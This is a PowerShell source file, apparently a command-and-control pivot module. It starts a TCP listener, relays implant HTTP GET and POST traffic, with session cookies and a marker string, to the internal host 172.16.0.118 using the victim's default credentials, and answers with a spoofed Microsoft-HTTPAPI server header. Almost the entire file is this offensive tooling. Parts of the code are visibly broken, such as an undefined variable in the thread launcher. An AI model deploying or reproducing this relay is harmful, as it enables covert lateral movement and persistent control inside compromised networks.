function start-scriptblock
{
    param(
        [scriptblock]$script
    )
    &$scripblock
}

function Get-WebclientDiasy ($Cookie) {
    $wc = New-Object System.Net.WebClient; 
    $wc.UseDefaultCredentials = $true; 
    $wc.Proxy.Credentials = $wc.Credentials;
    if ($cookie) {
        $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
    } 
    $wc 
}

function Invoke-DaisyChain($port) {


$ListPort = $port
$ListPort = new-object System.Net.IPEndPoint([ipaddress]::any,$ListPort) 
$listener = New-Object System.Net.Sockets.TcpListener($ListPort)
$listener.Start()
$running = $true

while ($running){
    $tcpclient = $listener.AcceptTcpClient()
    $scripblock = {
        $client = $tcpclient
         
        #Region Main FUnction - Add message commands in here
        function add-newclient
        {
            param(
                [object]$client
            )
            $bytes = New-Object System.Byte[] 5520420
            $stream = $client.GetStream()
                 
            while (($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){

                    #receive data
                    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                    $data = $EncodedText.GetString($bytes,0, $i)

                    $data = @($data -split '[\r\n]+')

                    foreach ($line in $data) {
                         if ($line.contains("GET")) {
                             $dataget = $line -replace "GET /",""
                             $dataget = $dataget -replace " HTTP/1.1",""
                             $dataget = $dataget -replace " HTTP/1.0",""
                             $dataget = $dataget -replace "connect","daisy"
                         }
                         if ($line.contains("Cookie")) {
                            $cookie = $line -replace "Cookie: SessionID=",""
                         }
                    }
                    #write-host "========HTTP Outgoing========"
                    $url = "http://172.16.0.118/" + $dataget
                    #write-host $url
                    #write-host  "Cookie: SessionID=" $cookie
                    #write-host "========HTTP Outgoing========"

                    $getreq = $EncodedText.GetString($bytes,0, 3)

                    if ($getreq -eq "GET")  {

                        #Get request
                        #write-host "========HTTP GET====="
                        #write-host $data
                        #write-host "========HTTP GET====="
                        $pm = (Get-WebclientDiasy -Cookie $cookie).DownloadString($url)
                    } else
                    {
                        #write-host "========HTTP POST====="
                        #write-host $i
                        #write-host $cookie
                        #write-host $data
                        #write-host "========HTTP POST====="


                        #receive data
                        #$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                        #$dataedit = $EncodedText.GetString($bytes,0, $i)
                        $linenum=0
                        foreach ($line in $data) {

                            if($linenum -eq 0){
                                %{ [regex]::matches($line, "(.*)NudsWdidf4reWDnNFUE") } | %{ 
                                    $cookie = $_.Groups[0].Value 
                                    $cooklen = $cookie.length
                                    $cookie = $cookie -replace "NudsWdidf4reWDnNFUE", ''
                                }
                            }
                            $linenum = $linenum+1
                        }
                        #write-host "========HTTP POST====="
                        
                        #write-host $cookie
                        $bytes = $bytes[$cooklen..$i]
                        $t = $i -$cooklen
                        $t = $t -1
                        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                        $RandomURI = $EncodedText.GetString($bytes,0,15)
                        #write-host $RandomURI
                        #write-host $t
                        #write-host $i
                        #write-host $bytes.length
                        $newbyte = $bytes[15..$t]
                        #write-host $newbyte.length
                        #If its not a GET it must be forwarded completely
                        $urlpost = $url + $RandomURI
                        #[io.file]::WriteAllBytes("c:\temp\TempHeuristicImage2.png", $newbyte)
                        #write-host "=="
                        #write-host $urlpost
                        #Write-Host $newcode 
                        #write-host "========Sending POST====="
                        $pm = (Get-WebclientDiasy -Cookie $cookie).UploadData("$urlpost", $newbyte)

                    }


                    $httplen = $pm.length
                    
                    #send http ok
                    $response = @"
HTTP/1.1 200 OK
Pragma: no-cache
Content-Length: $httplen
Expires: 0
Server: Microsoft-HTTPAPI/2.0
CacheControl: no-cache, no-store, must-revalidate
Connection: close            

$pm
"@
                    #write-host $response
                    $sendbytes = ([text.encoding]::ASCII).GetBytes($response)
                    $stream.Write($sendbytes,0,$sendbytes.Length)
                    $stream.Flush() 
                 
                 
                <############################################>
            }
             
            $client.close()
            $stream.close()
        } 
         
        #EndRegion
         
        #region Functions
         
        #endregion
         
        add-newclient -client $client
    }
 
    try{
        $thread = new-object system.threading.thread((start-scriptblock -script $scripblock))
        $thread.Start()
    }catch{}
}
}